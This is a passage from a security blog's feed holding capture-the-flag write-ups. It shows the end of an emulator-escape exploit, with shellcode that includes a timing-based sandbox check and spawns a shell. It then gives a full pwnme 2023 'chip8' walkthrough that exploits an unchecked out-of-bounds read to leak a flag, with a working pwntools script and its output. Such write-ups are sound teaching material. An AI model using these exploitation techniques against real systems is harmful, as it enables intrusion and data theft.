        <span class="s2">&#34;nop</span><span class="se">\n</span><span class="s2">&#34;</span>
        <span class="s2">&#34;nop</span><span class="se">\n</span><span class="s2">&#34;</span>
        <span class="s2">&#34;nop</span><span class="se">\n</span><span class="s2">&#34;</span>
        <span class="s2">&#34;nop</span><span class="se">\n</span><span class="s2">&#34;</span>
        <span class="s2">&#34;nop</span><span class="se">\n</span><span class="s2">&#34;</span>
        <span class="s2">&#34;nop</span><span class="se">\n</span><span class="s2">&#34;</span>
        <span class="s2">&#34;nop</span><span class="se">\n</span><span class="s2">&#34;</span>
        <span class="s2">&#34;nop</span><span class="se">\n</span><span class="s2">&#34;</span>
        <span class="s2">&#34;nop</span><span class="se">\n</span><span class="s2">&#34;</span>
        <span class="s2">&#34;nop</span><span class="se">\n</span><span class="s2">&#34;</span>
        <span class="s2">&#34;nop</span><span class="se">\n</span><span class="s2">&#34;</span>
        <span class="s2">&#34;nop</span><span class="se">\n</span><span class="s2">&#34;</span>
        <span class="s2">&#34;nop</span><span class="se">\n</span><span class="s2">&#34;</span>
        <span class="s2">&#34;rdtsc</span><span class="se">\n</span><span class="s2">&#34;</span>
        <span class="s2">&#34;mov r9, rax</span><span class="se">\n</span><span class="s2">&#34;</span>
        <span class="s2">&#34;shl rdx, 32</span><span class="se">\n</span><span class="s2">&#34;</span>
        <span class="s2">&#34;or r9, rdx</span><span class="se">\n</span><span class="s2">&#34;</span>
        
        <span class="s2">&#34;sub r9, r8</span><span class="se">\n</span><span class="s2">&#34;</span>
        <span class="s2">&#34;cmp r9, 0x100</span><span class="se">\n</span><span class="s2">&#34;</span>
        <span class="s2">&#34;jg sandbox</span><span class="se">\n</span><span class="s2">&#34;</span>
        
        <span class="s2">&#34;mov rax, 0x100006a</span><span class="se">\n</span><span class="s2">&#34;</span>
        <span class="s2">&#34;jmp rax</span><span class="se">\n</span><span class="s2">&#34;</span>

        <span class="s2">&#34;sandbox:</span><span class="se">\n</span><span class="s2">&#34;</span>
        <span class="s2">&#34;hlt</span><span class="se">\n</span><span class="s2">&#34;</span>
    <span class="p">)</span>

    <span class="n">map_stack</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">asm</span><span class="p">(</span><span class="s2">&#34;mov rsp, 0x1000000</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>
    <span class="n">map_stack</span> <span class="o">+=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">asm</span><span class="p">(</span><span class="s2">&#34;add rsp, 0x500</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>
    
    <span class="n">shell</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">asm</span><span class="p">(</span><span class="n">pwn</span><span class="o">.</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">amd64</span><span class="o">.</span><span class="n">linux</span><span class="o">.</span><span class="n">sh</span><span class="p">())</span>

    <span class="nb">print</span><span class="p">(</span><span class="n">shellcode</span> <span class="o">+</span> <span class="n">map_stack</span> <span class="o">+</span> <span class="n">shell</span><span class="p">)</span>
    <span class="nb">print</span><span class="p">(</span><span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">shellcode</span> <span class="o">+</span> <span class="n">map_stack</span> <span class="o">+</span> <span class="n">shell</span><span class="p">))</span>
    <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">shellcode</span> <span class="o">+</span> <span class="n">map_stack</span> <span class="o">+</span> <span class="n">shell</span><span class="p">)</span>


<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&#34;__main__&#34;</span><span class="p">:</span>
    <span class="n">exp</span><span class="p">()</span>
</code></pre></div>]]></content>
            
                 
                    
                 
                    
                         
                        
                            
                             
                                <category scheme="https://nasm.re/tags/ctf" term="ctf" label="ctf" />
                             
                                <category scheme="https://nasm.re/tags/nasm" term="nasm" label="nasm" />
                             
                                <category scheme="https://nasm.re/tags/pwn" term="pwn" label="pwn" />
                             
                                <category scheme="https://nasm.re/tags/linux" term="linux" label="linux" />
                             
                                <category scheme="https://nasm.re/tags/hacktm" term="hacktm" label="hacktm" />
                             
                                <category scheme="https://nasm.re/tags/cs2101" term="cs2101" label="cs2101" />
                             
                                <category scheme="https://nasm.re/tags/emulator" term="emulator" label="emulator" />
                             
                                <category scheme="https://nasm.re/tags/shellcoding" term="shellcoding" label="shellcoding" />
                             
                                <category scheme="https://nasm.re/tags/unicorn" term="unicorn" label="unicorn" />
                            
                        
                    
                
            
        </entry>
    
        
        <entry>
            <title type="html"><![CDATA[[pwnme 2023 - pwn] chip8]]></title>
            <link href="https://nasm.re/posts/chip8/?utm_source=atom_feed" rel="alternate" type="text/html"  hreflang="en" />
            <id>https://nasm.re/posts/chip8/</id>
            
            <published>2023-05-08T00:00:00+00:00</published>
            <updated>2023-05-08T00:00:00+00:00</updated>
            
            
            <content type="html"><![CDATA[<div class="gblog-post__anchorwrap">
    <h2 id="chip8">
        chip8
        <a data-clipboard-text="https://nasm.re/posts/chip8/#chip8" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor chip8" href="#chip8">
            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
        </a>
    </h2>
</div>
<blockquote>
<p>Solves: 24  Easy</p>
<p>I just found a repo of a chip-8 emulator, it may be vulnerable but I didn&rsquo;t had enough time to report the vulnerability with a working PoC.
You must find a way to get the flag in memory on the remote service !</p>
<p>Author: Express#8049</p>
<p>Remote service at : nc 51.254.39.184 1337</p>
</blockquote>
<p>chip8 is a emulator-pwn challenge I did during the <a
  class="gblog-markdown__link"
  href="https://pwnme.fr/"
  
  >pwnme CTF</a
> . You can find the related files <a
  class="gblog-markdown__link"
  href="https://github.com/ret2school/ctf/tree/master/2023/pwnme/pwn/chip8"
  
  >here</a
>.</p>
<div class="gblog-post__anchorwrap">
    <h2 id="code-review">
        Code review
        <a data-clipboard-text="https://nasm.re/posts/chip8/#code-review" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor Code review" href="#code-review">
            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
        </a>
    </h2>
</div>
<p>This challenge is based on an emulator called <a
  class="gblog-markdown__link"
  href="https://github.com/LakshyAAAgrawal/chip8emu"
  
  >c8emu</a
> that is updated with these lines of code:</p>
<pre tabindex="0"><code>diff --git a/include/Machine.hpp b/include/Machine.hpp
index af3d0d7..4288e15 100644
--- a/include/Machine.hpp
+++ b/include/Machine.hpp
@@ -17,6 +17,7 @@ class Machine{
 private:
 	std::vector&lt;uint8_t&gt; registers; // V0-VF
 	std::vector&lt;uint8_t&gt; memory; // Memory
+	std::vector&lt;uint8_t&gt; flag;
 	uint16_t I; // Index register
 	std::vector&lt;uint16_t&gt; stack; // Stack
 	uint8_t SP; // Stack Pointer
diff --git a/src/Machine.cpp b/src/Machine.cpp
index d34680e..2321296 100644
--- a/src/Machine.cpp
+++ b/src/Machine.cpp
@@ -6,10 +6,13 @@
 #include &lt;chrono&gt;
 #include &lt;thread&gt;
 
+std::string FLAG = &quot;PWNME{THIS_IS_A_SHAREHOLDER_AAAAAAAAAAAAAAAAAA}&quot;;
+
 Machine::Machine(){
 	registers = std::vector&lt;uint8_t&gt;(16, 0);
 	stack = std::vector&lt;uint16_t&gt;(32, 0);
 	memory = std::vector&lt;uint8_t&gt;(4096, 0);
+	flag = std::vector&lt;uint8_t&gt;(128, 0);
 	PC = 0x200;
 	last_tick = std::chrono::steady_clock::now();
 	I = 0;
@@ -134,8 +137,8 @@ void Machine::execute(uint16_t&amp; opcode){

 	if(it != first_match.end()) (it-&gt;second)(opcode);
 	else {
-		std::cout &lt;&lt; &quot;No match found for opcode &quot; &lt;&lt; std::hex &lt;&lt; (int) opcode &lt;&lt; &quot;\n&quot;;
-		std::cout &lt;&lt; &quot;This could be because this ROM uses SCHIP or another extension which is not yet supported.\n&quot;;
+		//std::cout &lt;&lt; &quot;No match found for opcode &quot; &lt;&lt; std::hex &lt;&lt; (int) opcode &lt;&lt; &quot;\n&quot;;
+		//std::cout &lt;&lt; &quot;This could be because this ROM uses SCHIP or another extension which is not yet supported.\n&quot;;
 		std::exit(0);
 	}
 }
@@ -179,12 +182,13 @@ void Machine::print_machine_state(){
 }
 
 void Machine::runLoop(){
+	std::copy(FLAG.begin(), FLAG.end(), flag.begin());
 	while(true){
 		// Update display
 		if(ge.is_dirty()){ // Check if the screen has to be updated
 			ge.update_display();
-			print_machine_state();
-			std::cout &lt;&lt; &quot;Opcode &quot; &lt;&lt; ((uint16_t) (memory[PC]&lt;&lt;8) | (memory[PC+1])) &lt;&lt; &quot;\n&quot;;
+			//print_machine_state();
+			//std::cout &lt;&lt; &quot;Opcode &quot; &lt;&lt; ((uint16_t) (memory[PC]&lt;&lt;8) | (memory[PC+1])) &lt;&lt; &quot;\n&quot;;
 		}
 
 		// Update the keyboard buffer to check for all pressed keys
diff --git a/src/c8emu.cpp b/src/c8emu.cpp
index e65123b..590228e 100644
--- a/src/c8emu.cpp
+++ b/src/c8emu.cpp
@@ -17,6 +17,10 @@ void loadFile(const std::string&amp; filename, std::vector&lt;uint8_t&gt;&amp; prog){
 int main(int argc, char ** argv){
 	Machine machine;
 
+	setbuf(stdin, NULL);
+	setbuf(stdout, NULL);
+	setbuf(stderr, NULL);
+
 	{ // Create block to deallocate the possibly large variable prog
 		// Load Instructions
 		std::vector&lt;uint8_t&gt; prog;
</code></pre><p>As you can see above, the prints that can leak informations about the program execution are removed, and an array named <code>flag</code> (on the heap) is inserted right after the memory mapping of length <code>0x1000</code> (on the heap) of the chip8 program. This way the goal would be to be able to leak the content of <code>flag</code> onto the screen.</p>
<div class="gblog-post__anchorwrap">
    <h2 id="few-words-on-chip8-architecture">
        few words on chip8 architecture
        <a data-clipboard-text="https://nasm.re/posts/chip8/#few-words-on-chip8-architecture" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor few words on chip8 architecture" href="#few-words-on-chip8-architecture">
            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
        </a>
    </h2>
</div>
<p>To get a quick overview of the chip8 arch, I advice you to read <a
  class="gblog-markdown__link"
  href="http://devernay.free.fr/hacks/chip8/C8TECH10.HTM#0.0"
  
  >this</a
>. Here are the most important informations from the technical reference:</p>
<ul>
<li>Chip-8 is a simple, interpreted, programming language which was first used on some do-it-yourself computer systems in the late 1970s and early 1980s. The COSMAC VIP, DREAM 6800, and ETI 660 computers are a few examples. These computers typically were designed to use a television as a display, had between 1 and 4K of RAM, and used a 16-key hexadecimal keypad for input. The interpreter took up only 512 bytes of memory, and programs, which were entered into the computer in hexadecimal, were even smaller.</li>
<li>Chip-8 has 16 general purpose 8-bit registers, usually referred to as Vx, where x is a hexadecimal digit (0 through F). There is also a 16-bit register called I. This register is generally used to store memory addresses, so only the lowest (rightmost) 12 bits are usually used.</li>
<li>Here are the instruction we need:
<ul>
<li><code>Annn</code> - <code>LD I, addr</code>. Set I = nnn. The value of register I is set to nnn.</li>
<li><code>6xkk</code> - <code>LD Vx, byte</code>, Set Vx = kk. The interpreter puts the value kk into register Vx.</li>
<li><code>Fx1E</code> - <code>ADD I, Vx</code>. Set I = I + Vx. The values of I and Vx are added, and the results are stored in I.</li>
<li><code>Dxyn</code> - <code>DRW Vx, Vy, nibble</code>. Display n-byte sprite starting at memory location I at (Vx, Vy), set VF = collision. The interpreter reads n bytes from memory, starting at the address stored in I. These bytes are then displayed as sprites on screen at coordinates (Vx, Vy). Sprites are XORed onto the existing screen. If this causes any pixels to be erased, VF is set to 1, otherwise it is set to 0. If the sprite is positioned so part of it is outside the coordinates of the display, it wraps around to the opposite side of the screen. See instruction 8xy3 for more information on XOR, and section 2.4, Display, for more information on the Chip-8 screen and sprites.</li>
</ul>
</li>
</ul>
<pre tabindex="0"><code class="language-nnn" data-lang="nnn">n or nibble - A 4-bit value, the lowest 4 bits of the instruction
x - A 4-bit value, the lower 4 bits of the high byte of the instruction
y - A 4-bit value, the upper 4 bits of the low byte of the instruction
kk or byte - An 8-bit value, the lowest 8 bits of the instruction 
</code></pre><div class="gblog-post__anchorwrap">
    <h2 id="the-bug">
        The bug
        <a data-clipboard-text="https://nasm.re/posts/chip8/#the-bug" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor The bug" href="#the-bug">
            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
        </a>
    </h2>
</div>
<p>The bug lies into the implementation around the instruction that use the <code>I</code> register. Indeed, as you read above, the <code>I</code> register is 16 bits wide. Thus we could we print onto the screen with the help of the <code>DRW</code> instruction data stored from <code>memory[I=0]</code> up to <code>memory[I=2^16 - 1]</code>. Let&rsquo;s see how does it  handle the <code>DRW</code> instruction:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="c1">// https://github.com/LakshyAAAgrawal/chip8emu/blob/master/src/Machine.cpp#L123
</span><span class="c1"></span>
<span class="p">{</span><span class="mh">0xd000</span><span class="p">,</span> <span class="p">[</span><span class="n">this</span><span class="p">](</span><span class="kt">uint16_t</span><span class="o">&amp;</span> <span class="n">op</span><span class="p">){</span> <span class="c1">// TODO - Dxyn - DRW Vx, Vy, nibble
</span><span class="c1"></span>    <span class="n">registers</span><span class="p">[</span><span class="mh">0xf</span><span class="p">]</span> <span class="o">=</span> <span class="n">ge</span><span class="p">.</span><span class="n">draw_sprite</span><span class="p">(</span><span class="n">memory</span><span class="p">.</span><span class="n">begin</span><span class="p">()</span> <span class="o">+</span> <span class="n">I</span><span class="p">,</span> <span class="n">memory</span><span class="p">.</span><span class="n">begin</span><span class="p">()</span> <span class="o">+</span> <span class="n">I</span> <span class="o">+</span> <span class="p">(</span><span class="n">op</span> <span class="o">&amp;</span> <span class="mh">0x000f</span><span class="p">),</span> <span class="n">registers</span><span class="p">[(</span><span class="n">op</span> <span class="o">&amp;</span> <span class="mh">0x0f00</span><span class="p">)</span><span class="o">&gt;&gt;</span><span class="mi">8</span><span class="p">]</span> <span class="o">%</span> <span class="mh">0x40</span><span class="p">,</span> <span class="n">registers</span><span class="p">[(</span><span class="n">op</span> <span class="o">&amp;</span> <span class="mh">0x00f0</span><span class="p">)</span><span class="o">&gt;&gt;</span><span class="mi">4</span><span class="p">]</span> <span class="o">%</span> <span class="mh">0x20</span><span class="p">);</span>
<span class="p">}}</span>
</code></pre></div><p>The first and the second argument are the begin and the end of the location where data to print are stored. <code>(op &amp; 0x000f)</code> represents the amount of bytes we&rsquo;d like to print. As you can see no checks are performed, this way we able to get a read out of bound from from <code>memory[I=0]</code> up to <code>memory[I=2^16 - 1]</code>.</p>
<div class="gblog-post__anchorwrap">
    <h2 id="exploitation">
        Exploitation
        <a data-clipboard-text="https://nasm.re/posts/chip8/#exploitation" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor Exploitation" href="#exploitation">
            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
        </a>
    </h2>
</div>
<p>Now we now how we could exfiltrate the flag we can write this tiny chip8 program:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="n">code</span> <span class="o">=</span> <span class="p">[</span>
    <span class="mh">0xAFFF</span><span class="p">,</span> <span class="c1"># Annn - LD I, addr, I  = 0xfff</span>
    <span class="mh">0x6111</span><span class="p">,</span> <span class="c1"># 6xkk - LD Vx, byte, R1 = 0x11</span>
    <span class="mh">0xF11E</span><span class="p">,</span> <span class="c1"># ADD I, R1, I =&gt; 0x1010</span>
    <span class="mh">0xDBCF</span>  <span class="c1"># Write on screen (xored with current pixels) 15 bytes from I=0x1010</span>
<span class="p">]</span>
</code></pre></div><p>We read the flag from <code>memory[0x1010]</code> given <code>memory</code> is adjacent to the <code>flag</code> (<code>memory[0x1000]</code> == begin of the chunk <code>flag</code> within the heap), and we add <code>0x10</code> to read the chunk content which is right after the header (prev_sz and chunk_sz). Once we launch it we get:</p>
<pre tabindex="0"><code>python3 exploit.py REMOTE HOST=51.254.39.184 PORT=1337
[*] '/media/nasm/7044d811-e1cd-4997-97d5-c08072ce9497/ret2school/ctf/2023/pwnme/pwn/chip8/wrapper'
    Arch:     amd64-64-little
╔════════════════════════════════════════════════════════════════╗
║ █ █ ▄▄▄                                                        ║
║ █  ██▀▄                                                        ║
║ █▄▄▄▀▄█                                                        ║
║ █  ▄ ▀▀                                                        ║
║ ▄██   ▀                                                        ║
║  █▄█▀ ▀                                                        ║
║ ▀▄█▀▀██                                                        ║
║ ▀▀ ▀▀ ▀                                                        ║
</code></pre><p>If we decode chars by hand (each byte is a line for which white is 1 and black zero), we get:</p>
<pre tabindex="0"><code>╔════════════════════════════════════════════════════════════════╗
║ █ █ ▄▄▄                                                        ║PW
║ █  ██▀▄                                                        ║NM
║ █▄▄▄▀▄█                                                        ║E{
║ █  ▄ ▀▀                                                        ║CH
║ ▄██   ▀                                                        ║18
║  █▄█▀ ▀                                                        ║-8
║ ▀▄█▀▀██                                                        ║_3
║ ▀▀ ▀▀ ▀                                                         m
</code></pre><p>If we repeat this step 4 times (by incrementing the value of V1), we finally managed to get the flag: <code>PWNME{CH1p-8_3mu14t0r_1s_h4Ck4bl3_1n_2023_y34h}</code>.</p>
<div class="gblog-post__anchorwrap">
    <h2 id="full-exploit">
        Full exploit
        <a data-clipboard-text="https://nasm.re/posts/chip8/#full-exploit" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor Full exploit" href="#full-exploit">
            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
        </a>
    </h2>
</div>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="ch">#!/usr/bin/env python</span>
<span class="c1"># -*- coding: utf-8 -*-</span>

<span class="c1"># this exploit was generated via</span>
<span class="c1"># 1) pwntools</span>
<span class="c1"># 2) ctfmate</span>

<span class="kn">import</span> <span class="nn">os</span>
<span class="kn">import</span> <span class="nn">time</span>
<span class="kn">import</span> <span class="nn">pwn</span>

<span class="n">BINARY</span> <span class="o">=</span> <span class="s2">&#34;wrapper&#34;</span>
<span class="n">LIBC</span> <span class="o">=</span> <span class="s2">&#34;/usr/lib/x86_64-linux-gnu/libc.so.6&#34;</span>
<span class="n">LD</span> <span class="o">=</span> <span class="s2">&#34;/lib64/ld-linux-x86-64.so.2&#34;</span>

<span class="c1"># Set up pwntools for the correct architecture</span>
<span class="n">exe</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">ELF</span><span class="p">(</span><span class="n">BINARY</span><span class="p">)</span>
<span class="n">libc</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">ELF</span><span class="p">(</span><span class="n">LIBC</span><span class="p">)</span>
<span class="n">ld</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">ELF</span><span class="p">(</span><span class="n">LD</span><span class="p">)</span>
<span class="n">pwn</span><span class="o">.</span><span class="n">context</span><span class="o">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s2">&#34;tmux&#34;</span><span class="p">,</span> <span class="s2">&#34;splitw&#34;</span><span class="p">,</span> <span class="s2">&#34;-h&#34;</span><span class="p">]</span>
<span class="n">pwn</span><span class="o">.</span><span class="n">context</span><span class="o">.</span><span class="n">delete_corefiles</span> <span class="o">=</span> <span class="kc">True</span>
<span class="n">pwn</span><span class="o">.</span><span class="n">context</span><span class="o">.</span><span class="n">rename_corefiles</span> <span class="o">=</span> <span class="kc">False</span>
<span class="n">p64</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span>
<span class="n">u64</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">u64</span>
<span class="n">p32</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p32</span>
<span class="n">u32</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">u32</span>
<span class="n">p16</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p16</span>
<span class="n">u16</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">u16</span>
<span class="n">p8</span>  <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p8</span>
<span class="n">u8</span>  <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">u8</span>

<span class="n">host</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">HOST</span> <span class="ow">or</span> <span class="s1">&#39;127.0.0.1&#39;</span>
<span class="n">port</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">pwn</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">PORT</span> <span class="ow">or</span> <span class="mi">1337</span><span class="p">)</span>


<span class="k">def</span> <span class="nf">local</span><span class="p">(</span><span class="n">argv</span><span class="o">=</span><span class="p">[],</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">):</span>
    <span class="s1">&#39;&#39;&#39;Execute the target binary locally&#39;&#39;&#39;</span>
    <span class="k">if</span> <span class="n">pwn</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">GDB</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">pwn</span><span class="o">.</span><span class="n">gdb</span><span class="o">.</span><span class="n">debug</span><span class="p">([</span><span class="n">exe</span><span class="o">.</span><span class="n">path</span><span class="p">]</span> <span class="o">+</span> <span class="n">argv</span><span class="p">,</span> <span class="n">gdbscript</span><span class="o">=</span><span class="n">gdbscript</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">pwn</span><span class="o">.</span><span class="n">process</span><span class="p">([</span><span class="n">exe</span><span class="o">.</span><span class="n">path</span><span class="p">]</span> <span class="o">+</span> <span class="n">argv</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>


<span class="k">def</span> <span class="nf">remote</span><span class="p">(</span><span class="n">argv</span><span class="o">=</span><span class="p">[],</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">):</span>
    <span class="s1">&#39;&#39;&#39;Connect to the process on the remote host&#39;&#39;&#39;</span>
    <span class="n">io</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">connect</span><span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">)</span>
    <span class="k">if</span> <span class="n">pwn</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">GDB</span><span class="p">:</span>
        <span class="n">pwn</span><span class="o">.</span><span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="n">gdbscript</span><span class="o">=</span><span class="n">gdbscript</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">io</span>


<span class="k">def</span> <span class="nf">start</span><span class="p">(</span><span class="n">argv</span><span class="o">=</span><span class="p">[],</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">):</span>
    <span class="s1">&#39;&#39;&#39;Start the exploit against the target.&#39;&#39;&#39;</span>
    <span class="k">if</span> <span class="n">pwn</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">LOCAL</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">local</span><span class="p">(</span><span class="n">argv</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">remote</span><span class="p">(</span><span class="n">argv</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>


<span class="n">gdbscript</span> <span class="o">=</span> <span class="s1">&#39;&#39;&#39;
</span><span class="s1">source ~/Downloads/pwndbg/gdbinit.py
</span><span class="s1">&#39;&#39;&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="o">**</span><span class="nb">locals</span><span class="p">())</span>

<span class="n">pwn</span><span class="o">.</span><span class="n">context</span><span class="o">.</span><span class="n">endianness</span> <span class="o">=</span> <span class="s1">&#39;big&#39;</span>

<span class="n">STEP</span><span class="o">=</span><span class="mi">0</span>

<span class="k">def</span> <span class="nf">exp</span><span class="p">():</span>
    <span class="n">io</span> <span class="o">=</span> <span class="n">start</span><span class="p">()</span>

    <span class="c1"># every registers are zero-ed at the begin of the program</span>
    <span class="n">code</span> <span class="o">=</span> <span class="p">[</span>
        <span class="mh">0xAFFF</span><span class="p">,</span> <span class="c1"># Annn - LD I, addr, I  = 0xfff</span>
		<span class="mh">0x6111</span> <span class="o">+</span> <span class="mh">0xf</span><span class="o">*</span><span class="n">STEP</span><span class="p">,</span> <span class="c1"># 6xkk - LD Vx, byte, R1 = 0x1F</span>
        <span class="mh">0xF11E</span><span class="p">,</span> <span class="c1"># ADD I, R1, I =&gt; 0x101F</span>
		<span class="mh">0xDBCF</span>  <span class="c1"># Write on screen (xored with current pixels) 15 bytes from I</span>
    <span class="p">]</span>

    <span class="n">code_to_send</span> <span class="o">=</span> <span class="p">[</span><span class="n">pwn</span><span class="o">.</span><span class="n">p16</span><span class="p">(</span><span class="n">k</span><span class="p">)</span> <span class="k">for</span> <span class="n">k</span> <span class="ow">in</span> <span class="n">code</span><span class="p">]</span>

    <span class="n">io</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;Enter ROM code: &#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">code_to_send</span><span class="p">))</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>

    <span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>

    <span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>

<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&#34;__main__&#34;</span><span class="p">:</span>
    <span class="n">exp</span><span class="p">()</span>

<span class="s2">&#34;&#34;&#34;
</span><span class="s2">PWNME{CH1p-8_3mu14t0r_1s_h4Ck4bl3_1n_2023_y34h}
</span><span class="s2">╔════════════════════════════════════════════════════════════════╗
</span><span class="s2">║ █ █ ▄▄▄                                                        ║PW
</span><span class="s2">║ █  ██▀▄                                                        ║NM
</span><span class="s2">║ █▄▄▄▀▄█                                                        ║E{
</span><span class="s2">║ █  ▄ ▀▀                                                        ║CH
</span><span class="s2">║ ▄██   ▀                                                        ║18
</span><span class="s2">║  █▄█▀ ▀                                                        ║-8
</span><span class="s2">║ ▀▄█▀▀██                                                        ║_3
</span><span class="s2">║ ▀▀ ▀▀ ▀                                                         m
</span><span class="s2">
</span><span class="s2">second part
</span><span class="s2">╔════════════════════════════════════════════════════════════════╗
</span><span class="s2">║ ██▄▀█ █                                                        ║mu
</span><span class="s2">║  ██ ▄ ▀                                                        ║14
</span><span class="s2">║ ▀██ ▀                                                          ║t0
</span><span class="s2">║ █▀█▄▄█▄                                                        ║r_
</span><span class="s2">║ ▄██  ▄█                                                        ║1s
</span><span class="s2">║ █▄▀█▀▀▀                                                        ║_h
</span><span class="s2">║ ▄▀▀ ▀▄▄                                                        ║4C
</span><span class="s2">║ ▀▀ ▀ ▀▀                                                        ║k
</span><span class="s2">
</span><span class="s2">part three:
</span><span class="s2">════════════════════════════════════════════════════════════════╗
</span><span class="s2">║ ▄█▀ ▀▄                                                         ║4b
</span><span class="s2">║ ▀█▄▀▀▄▄                                                        ║l3
</span><span class="s2">║ ▀▄█▀▀▀█                                                        ║_1
</span><span class="s2">║ █▀▄███▄                                                        ║n_
</span><span class="s2">║  ██  ▀                                                         ║20
</span><span class="s2">║  ██  █▄                                                        ║23
</span><span class="s2">║ █▄██▀▀█                                                        ║_y
</span><span class="s2">║  ▀▀  ▀▀                                                         3
</span><span class="s2">
</span><span class="s2">part four
</span><span class="s2">
</span><span class="s2">║ ▄█▀▄▀                                                          ║4h
</span><span class="s2">║ ▀▀▀▀▀ ▀                                                        ║}
</span><span class="s2">
</span><span class="s2">
</span><span class="s2">&#34;&#34;&#34;</span>
</code></pre></div>]]></content>
            
                 
                    
                 
                    
                         
                        
                            
                             
                                <category scheme="https://nasm.re/tags/ctf" term="ctf" label="ctf" />
                             
                                <category scheme="https://nasm.re/tags/nasm" term="nasm" label="nasm" />
                             
                                <category scheme="https://nasm.re/tags/pwn" term="pwn" label="pwn" />
                             
                                <category scheme="https://nasm.re/tags/linux" term="linux" label="linux" />
                             
                                <category scheme="https://nasm.re/tags/pwnme" term="pwnme" label="pwnme" />
                             
                                <category scheme="https://nasm.re/tags/chip8" term="chip8" label="chip8" />
                             
                                <category scheme="https://nasm.re/tags/emulator" term="emulator" label="emulator" />
                            
                        
